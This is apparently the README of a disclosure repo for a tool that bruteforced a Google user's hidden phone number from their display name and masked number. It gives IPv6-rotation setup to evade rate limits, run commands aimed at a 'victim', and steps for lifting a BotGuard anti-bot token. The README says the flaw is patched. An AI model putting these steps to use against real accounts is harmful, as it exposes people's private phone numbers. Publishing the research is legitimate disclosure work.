
# gpb

This repo contains files relevant to my blog post [Bruteforcing the phone number of any Google user](/articles/leaking-google-phones).

> [!IMPORTANT]  
> This vulnerability has already been patched and as such, this program will no longer work.

### Setting up IPv6

The following steps require a server with a /48 IPv6 range. Most VPS providers provide IPv6 ranges routed to your server (ex. [BuyVM](https://buyvm.net/), [Vultr](https://vultr.com/), [Netcup](https://www.netcup.com/en), [Aeza](https://aeza.net/) etc.)

**View your network interface**

```
root@server:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute
       valid_lft forever preferred_lft forever
2: ens3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 52:54:00:f1:e7:db brd ff:ff:ff:ff:ff:ff
    altname enp0s3
    inet 88.54.35.66/32 brd 77.239.124.111 scope global ens3
       valid_lft forever preferred_lft forever
    inet6 2a03:dead:beef::2/48 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::5054:ff:fef1:e7db/64 scope link
       valid_lft forever preferred_lft forever
```

From this, my interface is ens3 and my IPv6 range is 2a03:dead:beef::/48

> For the following steps, replace ens3 and 2a03:dead:beef::/48 with your network interface and IPv6 range accordingly.

**Install ndppd**

```bash
sudo apt update && sudo apt install ndppd -y
```

Edit /etc/ndppd.conf to the following:

```
route-ttl 30000

proxy ens3 {
    router no
    timeout 500
    ttl 30000

    rule 2a03:dead:beef::/48 {
        static
    }
}
```

Run the following commands:

```bash
# Restart the service
service ndppd restart

# Add route
ip route add local 2a03:dead:beef::/48 dev ens3

# Open ip_nonlocal_bind for binding any IP address:
sysctl net.ipv6.ip_nonlocal_bind=1
```

You can now test that IPv6 works properly with curl:

```
$ curl --interface 2a03:dead:beef::cafe ipv6.ip.sb
2a03:dead:beef::cafe
```

### Installation

Install dependencies

```bash
# Install Rust
$ curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
<snip>
$ . "$HOME/.cargo/env" 

# Install required dependencies
sudo apt install pkg-config libssl-dev gcc -y
```

Compile the program

```bash
$ git clone https://github.com/ddd/gpb
$ cd gpb
$ cargo build --release
```

Update ulimit 

```
ulimit -n 1000000
```

### Usage

In this example, the victim's google account display name is "Henry Chancellor" and the Google account forgot password flow gives the phone mask `•• ••••••50`.

```
$ ./target/release/gpb -m full -f Henry -l Chancellor -s "2a03:dead:beef::/48" -M "•• ••••••50" -w 3000 -b "<botguard_token_here>" 
```

-w is the worker count. You can increase/decrease this depending on how many CPU cores your machine has. The more workers, the longer the program may take to start (as it has to create a [reqwest::Client](https://docs.rs/reqwest/latest/reqwest/struct.Client.html) for each worker)

### Obtaining the BotGuard token (manual)

> To automatically obtain the botguard token, use the [bg_gen](https://github.com/ddd/gpb/tree/main/tools/bg_gen) tool

For the botguard token, visit the [JS-enabled username recovery page](https://accounts.google.com/signin/v2/usernamerecovery?hl=en), Open DevTools. Enter any email/number and any first/last name.

You should see a POST request to `https://accounts.google.com/_/lookup/accountlookup`.

Copy the botguard request token within the bgRequest query parameter. You may need to URL decode the parameter value.

```
bgRequest: ["username-recovery","botguard_token_will_be_here"]
```








